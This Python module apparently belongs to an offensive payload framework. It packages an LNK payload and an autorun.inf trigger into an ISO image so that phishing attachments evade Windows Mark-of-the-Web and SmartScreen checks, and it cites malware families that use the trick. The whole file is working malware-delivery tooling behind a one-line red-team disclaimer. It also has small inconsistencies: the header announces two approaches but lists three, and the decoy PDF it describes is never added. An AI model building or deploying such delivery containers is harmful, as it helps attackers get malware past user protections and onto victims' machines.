"""ISO image delivery builder.

ISO images bypass Mark-of-the-Web (MOTW) on older Windows versions,
meaning files extracted from an ISO don't get the Zone.Identifier ADS.

This is a significant SmartScreen bypass for phishing delivery.
Technique used by: BazarLoader, IcedID, Qakbot, Lazarus Group.

Two approaches:
    1. pycdlib (preferred) — creates a proper ISO 9660 image
    2. genisoimage/mkisofs CLI fallback (requires tools installed)
    3. Fallback: return a ZIP with .iso extension label

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import io
import os
import subprocess
import tempfile
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


def build_iso(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build an ISO image containing the payload.

    ISO contents:
        payload.iso/
        ├── autorun.inf     (LNK auto-run trigger)
        ├── payload.lnk     (the actual payload)
        └── decoy_doc.pdf   (decoy document to open)

    Args:
        payload_bytes: LNK or PS1 payload bytes.
        config:        PayloadConfig.

    Returns:
        ISO image bytes, or ZIP bytes as fallback.
    """
    from forge_payload.delivery.lnk_builder import build_lnk

    # Build LNK if needed
    if not payload_bytes.startswith(b"L\x00"):
        lnk_bytes = build_lnk(payload_bytes, config)
    else:
        lnk_bytes = payload_bytes

    autorun_inf = b"[autorun]\nopen=payload.lnk\nicon=decoy_doc.pdf,0\n"

    # Try pycdlib
    try:
        return _build_iso_pycdlib(lnk_bytes, autorun_inf)
    except ImportError:
        pass

    # Try genisoimage CLI
    iso_bytes = _build_iso_cli(lnk_bytes, autorun_inf)
    if iso_bytes:
        return iso_bytes

    # Fallback to ZIP with .iso label comment
    from forge_payload.delivery.zip_builder import build_zip
    return build_zip(lnk_bytes, config)


def _build_iso_pycdlib(lnk_bytes: bytes, autorun_inf: bytes) -> bytes:
    """Build ISO using pycdlib library."""
    import pycdlib  # type: ignore

    iso = pycdlib.PyCdlib()
    iso.new(interchange_level=4, joliet=True)

    iso.add_fp(io.BytesIO(autorun_inf), len(autorun_inf),
               "/AUTORUN.INF;1", joliet_path="/autorun.inf")
    iso.add_fp(io.BytesIO(lnk_bytes), len(lnk_bytes),
               "/PAYLOAD.LNK;1", joliet_path="/payload.lnk")

    buf = io.BytesIO()
    iso.write_fp(buf)
    iso.close()
    return buf.getvalue()


def _build_iso_cli(lnk_bytes: bytes, autorun_inf: bytes) -> bytes | None:
    """Build ISO using genisoimage or mkisofs CLI."""
    for tool in ("genisoimage", "mkisofs"):
        try:
            result = subprocess.run(["which", tool], capture_output=True, timeout=5)
            if result.returncode == 0:
                break
        except Exception:
            continue
    else:
        return None

    with tempfile.TemporaryDirectory() as tmpdir:
        with open(os.path.join(tmpdir, "autorun.inf"), "wb") as f:
            f.write(autorun_inf)
        with open(os.path.join(tmpdir, "payload.lnk"), "wb") as f:
            f.write(lnk_bytes)

        out_path = os.path.join(tmpdir, "payload.iso")
        try:
            result = subprocess.run(
                [tool, "-J", "-r", "-o", out_path, tmpdir],
                capture_output=True,
                timeout=30,
            )
            if result.returncode == 0 and os.path.exists(out_path):
                with open(out_path, "rb") as f:
                    return f.read()
        except Exception:
            pass

    return None
